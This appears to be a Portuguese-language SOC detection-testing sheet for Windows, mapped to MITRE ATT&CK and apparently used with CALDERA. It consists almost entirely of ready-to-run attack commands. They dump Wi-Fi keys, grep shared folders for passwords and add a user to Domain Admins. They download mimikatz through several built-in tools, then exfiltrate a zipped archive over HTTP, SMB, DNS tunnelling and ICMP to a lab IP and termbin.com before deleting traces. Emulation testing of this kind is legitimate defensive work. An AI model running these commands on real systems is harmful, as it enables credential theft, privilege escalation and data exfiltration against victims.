# __SOC - Test Commands (`Windows`)__ 

### __Table of Techniques (`MITRE`)__

Tatic               | TechniqueID | TechniqueName
------------------- | ----------- | ----------------------
Collection          | T1074.001   | Local Data Staging
Collection          | T1113       | Screen Capture
Collection          | T1560       | Archive Collected Data
Collection          | T1560.001   | Archive via Utility
Command-and-control | T1071.002   | File Transfer Protocols
Command-and-control | T1071.004   | Application Layer Protocol
Command-and-control | T1095       | Non-Application Layer Protocol
Command-and-control | T1105       | Ingress Tool Transfer
Credential-access   | T1552.001   | Credentials In Files
Defense-evasion     | T1070.004   | File Deletion
Discovery           | T1007       | System Service Discovery
Discovery           | T1016       | System Network Configuration Discovery
Discovery           | T1018       | Remote System Discovery
Discovery           | T1033       | System Owner/User Discovery
Discovery           | T1040       | Network Sniffing
Discovery           | T1046       | Network Service Discovery
Discovery           | T1082       | System Information Discovery
Discovery           | T1083       | File and Directory Discovery
Discovery           | T1087.002   | Domain Account
Discovery           | T1124       | System Time Discovery
Discovery           | T1135       | Network Share Discovery
Discovery           | T1518.001   | Security Software Discovery
Exfiltration        | T1048       | Exfiltration Over Alternative Protocol
Exfiltration        | T1567       | Exfiltration Over Web Service
Persistence         | T1098       | Account Manipulation

#
### __Test Commands__

- Local Folder Create (TEMP) [[`Collection:T1074.001:Local Data Staging`](https://attack.mitre.org/techniques/T1074/001/)] (`CMD`)
```cmd
if not exist "%tmp%\caldera\exfil" mkdir %tmp%\caldera\exfil
if not exist "%tmp%\caldera\downloads" mkdir %tmp%\caldera\downloads
```

- Print da tela [[`Collection:T1113:Screen Capture`](https://attack.mitre.org/techniques/T1113/)] (`powershell`)
```powershell
$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;
   $graphics = [Drawing.Graphics]::FromImage($bmp);
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
   $bmp.Save($path);
   $graphics.Dispose();
   $bmp.Dispose();
}
if ($loadResult) {
  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);
  $dest = "$env:TMP\caldera\exfil\screenshot.png";
  screenshot $bounds $dest;
  if (Test-Path -Path $dest) {
    $dest;
    exit 0;
  };
};
```

- Listar historico de comandos do __Powershell__ (`powershell`)
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
```

- Lista as informações do sistema [[`Discovery:T1082:System Information Discovery`](https://attack.mitre.org/techniques/T1082/)] (`CMD`)
```cmd
systeminfo
```

- Listagem de servicos no host [[`Discovery:T1007:System Service Discovery`](https://attack.mitre.org/techniques/T1007/)] (`CMD`)
```cmd
FOR /F "tokens=1,2" %A IN ('"sc query state= all 2>NUL | findstr /I "nome name" | findstr /I /V "exib""') do @(echo %B: && sc qc %B 2>NUL)
```

- Listagem de senhas nas redes sem fio do host [[`Discovery:T1007:System Service Discovery`](https://attack.mitre.org/techniques/T1007/)] (`powershell`)
```powershell
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{netsh wlan show profile name="$($_.Matches.Groups[1].Value.Trim())" key=clear}
```

- Lista programas de Antivirus [[`Discovery:T1518.001:Security Software Discovery`](https://attack.mitre.org/techniques/T1518/001/)] (`CMD`)
```cmd
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
```

- Lista qual o usuario em uso e suas permissoes [[`Discovery:T1033:System Owner/User Discovery`](https://attack.mitre.org/techniques/T1033/)] (`CMD`)
```cmd
whoami /all
```

- Lista Propriedades do usuario no dominio [[`Discovery:T1087.002:Domain Account`](https://attack.mitre.org/techniques/T1087/002/)] (`CMD`)
```cmd
net user %USERNAME% /domain
```

- Lista usuarios com permissao de administrador no dominio [[`Discovery:T1087.002:Domain Account`](https://attack.mitre.org/techniques/T1087/002/)] (`CMD`)
```cmd
net group "Domain Admins" /domain
```

- Lista usuarios logados na rede [[`Discovery:T1087.002:Domain Account`](https://attack.mitre.org/techniques/T1087/002/)] (`CMD`)
```cmd
FOR /F "TOKENS=1,2" %A IN ('"nslookup %userdnsdomain% 2>NUL | findstr /I "Address""') DO @(FOR /F "tokens=1,2,3 delims=." %X in ('"echo %B 2>NUL"') DO @(FOR /L %i IN (1,1,254) DO @(ping -w 1 -n 1 %X.%Y.%Z.%i 2>NUL | findstr /I "TTL=12" 1>NUL 2>NUL && echo Address: %X.%Y.%Z.%i && query user /server:%X.%Y.%Z.%i 2>NUL)))
```

- Tentar adicionar usuario ao grupo de administradores do dominio [[`Persistence:T1098:Account Manipulation`](https://attack.mitre.org/techniques/T1098/)] (`CMD`)
```cmd
net group "Domain Admins" teste_user /add /domain
```

- Lista configurações de IP/Rede [[`Discovery:T1016:System Network Configuration Discovery`](https://attack.mitre.org/techniques/T1016/)] (`CMD`)
```cmd
ipconfig /all
```

- Lista tabela ARP [[`Discovery:T1016:System Network Configuration Discovery`](https://attack.mitre.org/techniques/T1016/)] (`CMD`)
```cmd
arp -a
```

- Lista nomes Netbios [__DNSDOMAIN__][__LAN/24__] [[`Discovery:T1016:System Network Configuration Discovery`](https://attack.mitre.org/techniques/T1016/)] (`CMD`)
```cmd
FOR /F "TOKENS=1,2" %A IN ('"nslookup %userdnsdomain% | findstr /I "Address""') DO @(FOR /F "tokens=1,2,3 delims=." %X in ('echo %B') DO @(FOR /L %i IN (1,1,254) DO @(ping -w 3 -n 1 %X.%Y.%Z.%i 2>NUL | findstr /I "TTL=127 TTL=126 TTL=125" >NUL && echo Address: %X.%Y.%Z.%i && nbtstat -A %X.%Y.%Z.%i 2>NUL)))
```

- Lista servidor NTP [__Local__] [[`Discovery:T1124:System Time Discovery`](https://attack.mitre.org/techniques/T1124/)] (`CMD`)
```cmd
w32tm /query /status
```

- Checar restriçoes de servidores NTP [__Remoto__] [[`Discovery:T1124:System Time Discovery`](https://attack.mitre.org/techniques/T1124/)] (`CMD`)
```cmd
echo Europe: && w32tm /stripchart /computer:europe.pool.ntp.org  /samples:1 & echo. && echo North-America: && w32tm /stripchart /computer:north-america.pool.ntp.org /samples:1 & echo. && echo Asia: && w32tm /stripchart /computer:asia.pool.ntp.org /samples:1
```

- Lista servidor DNS [__local__] [[`Discovery:T1016:System Network Configuration Discovery`](https://attack.mitre.org/techniques/T1016/)] (`CMD`)
```cmd
nslookup 127.0.0.1
```

- Checar restriçoes de servidores de DNS [__Remoto__] [[`Command-and-control:T1071.004:Application Layer Protocol: DNS`](https://attack.mitre.org/techniques/T1071/004/)] (`CMD`)
```cmd
echo Google: && nslookup google.com 8.8.8.8 &
echo Control D: && nslookup google.com 76.76.2.0 &
echo Quad9: && nslookup google.com 9.9.9.9 &
echo OpenDNS Home: && nslookup google.com 208.67.222.222 &
echo Cloudflare: && nslookup google.com 1.1.1.1 &
echo CleanBrowsing: && nslookup google.com 185.228.168.9 &
echo Alternate:  && nslookup google.com 76.76.19.19 &
echo AdGuard:  && nslookup google.com 94.140.14.14
```

- Listar Hostnames [[`Discovery:T1018:Remote System Discovery`](https://attack.mitre.org/techniques/T1018/)] (`CMD`)
```cmd
FOR /F "TOKENS=1,2" %A IN ('"nslookup %userdnsdomain% | findstr /I "Address""') DO @( FOR /F "tokens=1,2,3 delims=." %X in ('echo %B') DO @(FOR /L %i IN (1,1,254) DO @(echo Address: %X.%Y.%Z.%i && ping -w 1 -n 1 %X.%Y.%Z.%i  >NUL && nslookup %X.%Y.%Z.%i 2>NUL | findstr /I "Nome: Name:" 2>NUL)))
```

- Lista pastas compartilhadas [__Local__] (`CMD`)
  - Lista permissoes das pastas compartilhadas (LOCAL) [[`Discovery:T1083:File and Directory Discovery`](https://attack.mitre.org/techniques/T1083/)]
    ```cmd
    for /F "tokens=1,2" %A in ('"net view localhost 2>NUL | findstr /i disc"') DO @(icacls "\\localhost\%A" 2>NUL)
    ```
  - Busca arquivos com palavras especficas (LOCAL) [[`Credential-access:T1552.001:Credentials In Files`](https://attack.mitre.org/techniques/T1552/001/)]
    ```cmd
    for /F "tokens=1,2" %A in ('"net view localhost 2>NUL | findstr /i disc"') DO @(for /F %B IN ('"dir /S /B "\\localhost\%A" 2>NUL | findstr ".xml .bat .ps .cmd .conf .config .ini .json .txt .yml .sql""') DO @(type "%B" 2>NUL | findstr /I "passw mysql oracle postgres sql senha username ftp ssh scp winscp vnc login" 2>NUL))
    ```

- Lista pastas compartilhadas [__Remoto__] [__DNSDOMAIN__] (`CMD`)

  - Lista permissoes das pastas compartilhadas [__DNSDOMAIN__] [[`Discovery:T1135:Network Share Discovery`](https://attack.mitre.org/techniques/T1135/)]
    ```cmd
    FOR /F "tokens=1,2" %A in ('"net view %USERDNSDOMAIN% 2>NUL | findstr /i disc"') DO @(icacls "\\%USERDNSDOMAIN%\%A" 2>NUL)
    ```
  - Busca arquivos com palavras especficas [__DNSDOMAIN__] [[`Credential-access:T1552.001:Credentials In Files`](https://attack.mitre.org/techniques/T1552/001/)]
    ```cmd
    for /F "tokens=1,2" %A in ('"net view %USERDNSDOMAIN% 2>NUL | findstr /i disc"') DO @(for /F %B IN ('"dir /S /B "\\%USERDNSDOMAIN%\%A" 2>NUL | findstr ".xml .bat .ps .cmd .conf .config .ini .json .txt .yml .sql""') DO @(echo "%B" 2>NUL && type "%B" 2>NUL | findstr /I "passw mysql oracle postgres sql senha username ftp ssh scp winscp vnc login" 2>NUL))
    ```

- Lista pastas compartilhadas [__Remoto__][__DNSDOMAIN__][__LAN/24__] [[`Discovery:T1135:Network Share Discovery`](https://attack.mitre.org/techniques/T1135/)] (`CMD`)

```cmd
FOR /F "TOKENS=1,2" %A IN ('"nslookup %userdnsdomain% 2>NUL | findstr /I "Addresses:""') DO @(FOR /F "tokens=1,2,3 delims=." %X in ('"echo %B 2>NUL"') DO @(FOR /L %i IN (1,1,254) DO @(ping -w 1 -n 1 %X.%Y.%Z.%i 2>NUL | findstr /I "TTL=12" 1>NUL 2>NUL && echo Address: %X.%Y.%Z.%i && net view %X.%Y.%Z.%i 2>NUL | findstr /I "disc" 2>NUL)))
```

- Teste de Port Scan na rede do host target [[`Discovery:T1046:Network Service Discovery`](https://attack.mitre.org/techniques/T1046/)] (`powershell`)

```powershell
$IPv4=((Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0] -split '\.')[0..2] -join '.';1..254 | % {"$IPv4.$_"} | % {$ip = $_; 22,23,3389,5900 | % {$port = $_; $socket = New-Object Net.Sockets.TcpClient; $wait = $socket.BeginConnect($ip, $port, $null, $null); $result = $wait.AsyncWaitHandle.WaitOne(100, $false); if ($result -eq $true) {Write-Host "$ip, $port, Open";$socket.EndConnect($wait)}; $socket.Close()}}
```

- Teste de download de arquivos/scripts 
  
  - `CMD`
    - CURL [[`Command-and-control:T1105:Ingress Tool Transfer`](https://attack.mitre.org/techniques/T1105/)]
      ```cmd
      curl -k -s -L https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASbat/winPEAS.bat -o %tmp%\caldera\downloads\winPEAS_curl.bat
      curl -k -s -L https://raw.githubusercontent.com/icyguider/ICMP-TransferTools/main/Invoke-IcmpDownload.ps1 -o %tmp%\caldera\downloads\Invoke-IcmpDownload_curl.ps1
      curl -k -s -L https://raw.githubusercontent.com/icyguider/ICMP-TransferTools/main/Invoke-IcmpUpload.ps1 -o %tmp%\caldera\downloads\Invoke-IcmpUpload_curl.ps1
      curl -k -s -L https://github.com/microsoft/etl2pcapng/releases/download/v1.10.0/etl2pcapng.exe -o %tmp%\caldera\downloads\etl2pcapng_curl.exe
      curl -k -s -L https://github.com/ParrotSec/mimikatz/raw/master/Win32/mimikatz.exe -o %tmp%\caldera\downloads\mimikatz_curl.exe
      curl -k -s -L https://gist.githubusercontent.com/hardw00t/302790bea71d8ff42aeb3d1e102007d1/raw/b78d3aee5d79a2db20f55e90e11100ed6293c18e/mimikatz.js -o %tmp%\caldera\downloads\mimikatzjs_curl.exe
      ```
    
    - Certutil [[`Command-and-control:T1105:Ingress Tool Transfer`](https://attack.mitre.org/techniques/T1105/)]
      ```cmd
      certutil.exe -urlcache -f https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASbat/winPEAS.bat %tmp%\caldera\downloads\winPEAS_certutil.bat
      certutil.exe -urlcache -f https://raw.githubusercontent.com/icyguider/ICMP-TransferTools/main/Invoke-IcmpDownload.ps1 %tmp%\caldera\downloads\Invoke-IcmpDownload_certutil.ps1
      certutil.exe -urlcache -f https://raw.githubusercontent.com/icyguider/ICMP-TransferTools/main/Invoke-IcmpUpload.ps1 %tmp%\caldera\downloads\Invoke-IcmpUpload_certutil.ps1
      certutil.exe -urlcache -f https://github.com/microsoft/etl2pcapng/releases/download/v1.10.0/etl2pcapng.exe %tmp%\caldera\downloads\etl2pcapng_certutil.exe
      certutil.exe -urlcache -f https://github.com/ParrotSec/mimikatz/raw/master/Win32/mimikatz.exe %tmp%\caldera\downloads\mimikatz_certutil.exe
      certutil.exe -urlcache -f https://gist.githubusercontent.com/hardw00t/302790bea71d8ff42aeb3d1e102007d1/raw/b78d3aee5d79a2db20f55e90e11100ed6293c18e/mimikatz.js %tmp%\caldera\downloads\mimikatzjs_certutil.exe
      ```
    
    - Bitsadmin [[`Command-and-control:T1105:Ingress Tool Transfer`](https://attack.mitre.org/techniques/T1105/)]
      ```cmd
      bitsadmin.exe /transfer downloadfileteste /download /priority normal https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASbat/winPEAS.bat %tmp%\caldera\downloads\winPEAS_bitsadmin.bat
      bitsadmin.exe /transfer downloadfileteste /download /priority normal https://raw.githubusercontent.com/icyguider/ICMP-TransferTools/main/Invoke-IcmpDownload.ps1 %tmp%\caldera\downloads\Invoke-IcmpDownload_bitsadmin.ps1
      bitsadmin.exe /transfer downloadfileteste /download /priority normal https://raw.githubusercontent.com/icyguider/ICMP-TransferTools/main/Invoke-IcmpUpload.ps1 %tmp%\caldera\downloads\Invoke-IcmpUpload_bitsadmin.ps1
      ```
  
  - `POWERSHELL`
    - IWR [[`Command-and-control:T1105:Ingress Tool Transfer`](https://attack.mitre.org/techniques/T1105/)]
    ```powershell
    iwr -useb https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASbat/winPEAS.bat -OutFile $env:TMP\caldera\downloads\winPEAS_iwr.bat
    iwr -useb https://raw.githubusercontent.com/icyguider/ICMP-TransferTools/main/Invoke-IcmpDownload.ps1 -OutFile $env:TMP\caldera\downloads\Invoke-IcmpDownload_iwr.ps1
    iwr -useb https://raw.githubusercontent.com/icyguider/ICMP-TransferTools/main/Invoke-IcmpUpload.ps1 -OutFile $env:TMP\caldera\downloads\Invoke-IcmpUpload_iwr.ps1
    iwr -useb https://github.com/microsoft/etl2pcapng/releases/download/v1.10.0/etl2pcapng.exe -OutFile $env:TMP\caldera\downloads\etl2pcapng_iwr.exe
    iwr -useb https://github.com/ParrotSec/mimikatz/raw/master/Win32/mimikatz.exe -OutFile $env:TMP\caldera\downloads\mimikatz_iwr.exe
    iwr -useb https://gist.githubusercontent.com/hardw00t/302790bea71d8ff42aeb3d1e102007d1/raw/b78d3aee5d79a2db20f55e90e11100ed6293c18e/mimikatz.js -OutFile $env:TMP\caldera\downloads\mimikatzjs_iwr.exe
    ```

    - Invoke-IcmpDownload [[`Command-and-control:T1095:Non-Application Layer Protocol`](https://attack.mitre.org/techniques/T1095/)]
      - Executar no servidor: 
        ```bash
        # https://github.com/icyguider/ICMP-TransferTools
        bash> cd ~/Downloads/tools/ICMP-TransferTools && while true;do sudo ./ICMP-SendFile.py 10.10.64.230 IP_DO_AGENT files/nc.exe;done
        ```

      - Executar no cliente: 
        ```powershell
        if (Test-Path $env:TMP\caldera\downloads\Invoke-IcmpDownload_curl.ps1) { 
          . $env:TMP\caldera\downloads\Invoke-IcmpDownload_curl.ps1; Invoke-IcmpDownload 10.10.64.230 $env:TMP\caldera\downloads\nc_curl.exe;
        }
        if (Test-Path $env:TMP\caldera\downloads\Invoke-IcmpDownload_certutil.ps1) { 
          . $env:TMP\caldera\downloads\Invoke-IcmpDownload_certutil.ps1; Invoke-IcmpDownload 10.10.64.230 $env:TMP\caldera\downloads\nc_certutil.exe;
        }
        if (Test-Path $env:TMP\caldera\downloads\Invoke-IcmpDownload_bitsadmin.ps1) { 
          . $env:TMP\caldera\downloads\Invoke-IcmpDownload_bitsadmin.ps1; Invoke-IcmpDownload 10.10.64.230 $env:TMP\caldera\downloads\nc_bitsadmin.exe;
        }
        if (Test-Path $env:TMP\caldera\downloads\Invoke-IcmpDownload_iwr.ps1) { 
          . $env:TMP\caldera\downloads\Invoke-IcmpDownload_iwr.ps1; Invoke-IcmpDownload 10.10.64.230 $env:TMP\caldera\downloads\nc_iwr.exe;
        }
        ```

    - FTP [[`Command-and-control:T1071.002:File Transfer Protocols`](https://attack.mitre.org/techniques/T1071/002/)]
      - Executar no servidor: 
        ```bash
        cd ~/Downloads/tools/ICMP-TransferTools/files && python3 -m pyftpdlib -p 8080
        ```
      - Executar no cliente: 
        ```powershell
        $ftpServer = "ftp://10.10.64.230:8080/";
        $user = "anonymous";
        $password = "anonymous";
        $remotePath = "file_ftp.txt";
        $localPath  = "$env:TMP\caldera\downloads\file_ftp.txt";

        $ftpRequest = [System.Net.FtpWebRequest]::Create("$ftpServer$remotePath");
        $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($user,$password);
        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::DownloadFile;
        $ftpRequest.UseBinary = $true;
        $ftpRequest.KeepAlive = $false;
        $ftpRequest.Timeout = 60000;

        $ftpResponse = $ftpRequest.GetResponse();
        $ftpStream = $ftpResponse.GetResponseStream();

        $localFile = New-Object System.IO.FileStream($localPath, [System.IO.FileMode]::Create);
        $ftpBuffer = New-Object byte[] 1024;
        $read = 0;
        while (($read = $ftpStream.Read($ftpBuffer, 0, 1024)) -gt 0)
        {
            $localFile.Write($ftpBuffer, 0, $read)
        };
        $localFile.Close();
        $ftpStream.Close();
        $ftpResponse.Close();
        ```

- Iniciando a captura de trafego da rede [[`Discovery:T1040:Network Sniffing`](https://attack.mitre.org/techniques/T1040/)] (`powershell`)
```powershell
$env:HostIP = ( Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress
netsh trace start capture=yes IPv4.Address=$env:HostIP tracefile=$env:TMP\caldera\capture.etl
Start-Sleep 90
netsh trace stop
```

- Convertendo arquivo __ETL__ para __PCAP__ [[`Collection:T1560.001:Archive via Utility`](https://attack.mitre.org/techniques/T1560/001/)] (`powershell`)
```powershell
if (Test-Path $env:TMP\caldera\downloads\etl2pcapng_curl.exe )     { &$env:TMP\caldera\downloads\etl2pcapng_curl.exe $env:TMP\caldera\capture.etl $env:TMP\caldera\exfil\capture_curl.pcap }
if (Test-Path $env:TMP\caldera\downloads\etl2pcapng_certutil.exe ) { &$env:TMP\caldera\downloads\etl2pcapng_certutil.exe $env:TMP\caldera\capture.etl $env:TMP\caldera\exfil\capture_certutil.pcap }
if (Test-Path $env:TMP\caldera\downloads\etl2pcapng_iwr.exe )      { &$env:TMP\caldera\downloads\etl2pcapng_iwr.exe $env:TMP\caldera\capture.etl $env:TMP\caldera\exfil\capture_iwr.pcap }
```

- Zipa a pasta __%tmp%\caldera\exfill__ [[`Collection:T1560:Archive Collected Data`](https://attack.mitre.org/techniques/T1560/)] (`powershell`)
```powershell
Compress-Archive -Path $env:TMP\caldera\exfil -DestinationPath $env:TMP\caldera\exfiltrate_caldera.zip
```

- Teste de exfiltracao (`CMD`)
  - CertReq.exe [[`Exfiltration:T1048:Exfiltration Over Alternative Protocol`](https://attack.mitre.org/techniques/T1048/)]
    ```cmd
    REM LAN
    CertReq.exe -Post -config "http://10.10.64.230/file/upload?cmd" %tmp%\caldera\exfiltrate_caldera.zip
    ```
  
  - Curl.exe [[`Exfiltration:T1567:Exfiltration Over Web Service`](https://attack.mitre.org/techniques/T1567/)]
    ```cmd
    REM WAN (termbin.com)
    curl -k -s http://termbin.com:9999 -d"Teste de Exfiltracao com CURL"
    ```

  - SMB (Porta: `445`) [[`Exfiltration:T1048:Exfiltration Over Alternative Protocol`](https://attack.mitre.org/techniques/T1048/)]
    - Executar no servidor: 
    ```bash
    cd ~/Downloads/tools/ICMP-TransferTools/files && smbserver.py -smb2support uploads ./uploads
    ```

    - Executar no cliente: 
    ```cmd
    REM LAN
    type %tmp%\caldera\exfiltrate_caldera.zip > \\10.10.64.230\uploads\exfiltrate_caldera.zip
    ```

  - DNS (Porta: `53`) [[`Command-and-control:T1071.004:Application Layer Protocol: DNS`](https://attack.mitre.org/techniques/T1071/004/)]
    - Checagem simples 
      - Executar no servidor: 
        ```bash
        tcpdump -i any udp and port 53
        ```
      - Executar no cliente:
        ```cmd
        REM LAN
        nslookup %COMPUTERNAME%-%USERNAME%-%DATE:~6,4%%DATE:~3,2%%DATE:~0,2%%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%.mydnsexfil.com 10.10.64.230
        ```

- Teste de exfiltracao (`powershell`)
  - DNS (Porta: `53`) [[`Exfiltration:T1048:Exfiltration Over Alternative Protocol`](https://attack.mitre.org/techniques/T1048/)]
    - Checagem avançada
      - Executar no servidor:
        ```python
        import re
        import sys
        from scapy.all import *

        data = []

        def dns_callback(pkt):
            global data
            if pkt.haslayer(DNSQR):
                data_tmp = pkt[DNSQR].qname.decode().split('.')[0]
                if 'END' in data_tmp:
                    output = ''.join(data)
                    sys.stdout.write(f'\r{output}\n')
                    exit()
                if re.search('^\d+L\w+', data_tmp):
                    if data_tmp.split('L')[1] not in data:
                        data.append(data_tmp.split('L')[1])
                        sys.stdout.write(f'\r{data_tmp}')

        if len(sys.argv) >= 2:
            IPAddr = sys.argv[1]
            sniff(filter=f"udp and port 53 and src host {IPAddr}", prn=dns_callback)
        else:
            print(f'Usage: {sys.argv[0]} Src_IP_Addr')
        ```
        
      - Executar no cliente:
        ```powershell
        # LAN
        $filename = "$env:TMP\caldera\exfiltrate_caldera.zip";
        if (Test-Path $filename) { 
            $fileBytes = [System.IO.File]::ReadAllBytes($filename);
            $hexString = [System.BitConverter]::ToString($fileBytes) -replace '-';
            $blockSize = 30
            $x = 0;
            nslookup -retry=1 "START$((Get-Date).ToString('yyyyMMddHHmmss')).exfil.com" 10.10.64.230;
            for ($i = 0; $i -lt $hexString.Length; $i += $blockSize*2) {
                $hexBlock = $hexString.Substring($i, [Math]::Min($blockSize*2, $hexString.Length - $i));
                nslookup -retry=1 "$($x)L$($hexBlock).exfil.com" 10.10.64.230;
                $x += 1;
            }
            nslookup -retry=1 "END$((Get-Date).ToString('yyyyMMddHHmmss')).exfil.com" 10.10.64.230;
        }
        ```

  - Invoke-WebRequest [[`Exfiltration:T1048:Exfiltration Over Alternative Protocol`](https://attack.mitre.org/techniques/T1048/)]
    ```powershell
    # LAN
    Invoke-WebRequest -uri "http://10.10.64.230/file/upload?pwsh" -Method Post -Headers @{"X-Request-Id" = "$env:COMPUTERNAME"} -Infile $env:TMP\caldera\exfiltrate_caldera.zip
    ```

  - ICMP (`PING`) [[`Exfiltration:T1048:Exfiltration Over Alternative Protocol`](https://attack.mitre.org/techniques/T1048/)]
    - Executar no servidor: 
      ```bash
        # https://github.com/icyguider/ICMP-TransferTools
        bash> cd ~/Downloads/tools/ICMP-TransferTools && while true;do sudo ./ICMP-ReceiveFile.py 172.30.200.100 exfiltrate_caldera.zip;done
      ```

    - Executar no cliente: 
      ```powershell
      # LAN
      if (Test-Path $env:TMP\caldera\downloads\Invoke-IcmpUpload_curl.ps1)      { . .\$env:TMP\caldera\downloads\Invoke-IcmpUpload_curl.ps1;      Invoke-IcmpUpload 10.10.64.230 $env:TMP\caldera\exfiltrate_caldera.zip}
      if (Test-Path $env:TMP\caldera\downloads\Invoke-IcmpUpload_certutil.ps1)  { . .\$env:TMP\caldera\downloads\Invoke-IcmpUpload_certutil.ps1;  Invoke-IcmpUpload 10.10.64.230 $env:TMP\caldera\exfiltrate_caldera.zip}
      if (Test-Path $env:TMP\caldera\downloads\Invoke-IcmpUpload_bitsadmin.ps1) { . .\$env:TMP\caldera\downloads\Invoke-IcmpUpload_bitsadmin.ps1; Invoke-IcmpUpload 10.10.64.230 $env:TMP\caldera\exfiltrate_caldera.zip}
      if (Test-Path $env:TMP\caldera\downloads\Invoke-IcmpUpload_iwr.ps1)       { . .\$env:TMP\caldera\downloads\Invoke-IcmpUpload_iwr.ps1;       Invoke-IcmpUpload 10.10.64.230 $env:TMP\caldera\exfiltrate_caldera.zip}
      ```
    
- Removendo a pasta e arquivos criados [[`Defense-evasion:T1070.004:File Deletion`](https://attack.mitre.org/techniques/T1070/004/)] (`CMD`) 
```cmd
rmdir /S /Q %tmp%\caldera
```

